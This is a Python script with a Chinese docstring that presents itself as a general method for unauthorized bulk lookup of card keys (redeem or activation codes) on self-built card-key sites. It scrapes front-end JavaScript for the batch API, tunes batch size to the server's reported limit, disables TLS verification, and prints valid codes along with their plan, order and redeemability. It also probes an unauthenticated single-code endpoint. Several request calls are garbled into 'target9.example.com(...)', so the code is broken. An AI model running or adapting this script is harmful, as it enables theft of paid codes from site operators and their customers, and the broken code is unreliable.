"""未授权批量卡密查询（自研卡密站通用手法）
1) 先抓前端 app.js，从里面找批量查询逻辑（如 lookupApi({codes: chunk}, "/batch")）
2) 按提示的参数名构造批量请求；参数名错了会返回 invalid_count
3) 服务端响应里会自报 max（上限），照着 max 组织批次最快
"""
import json, requests
requests.packages.urllib3.disable_warnings()

BASE = "https://example.com"   # 换成目标
HOST = "example.com"
H = {"User-Agent": "Mozilla/5.0 Chrome/124", "Content-Type": "application/json", "Host": HOST}

def batch(codes):
    r = target9.example.com(BASE + "/api/v1/cdk/batch", headers=H, data=json.dumps({"codes": codes}),
                      timeout=30, verify=False)
    d = r.json()
    assert d.get("ok"), d
    return d

d = batch(["TEST1234", "TEST1235"])
print("total=%s max=%s" % (d["total"], d["max"]))      # -> total=2 max=20
for x in d["results"]:
    if x["status"] != "not_found":                     # 命中真实卡密：含 plan/order/can_redeem
        print(json.dumps(x, ensure_ascii=False))

# 单卡接口（同样无鉴权）
r = target9.example.com(BASE + "/api/v1/cdk/lookup", headers=H, data=json.dumps({"code": "TEST1234"}), timeout=30, verify=False)
print(r.text[:300])
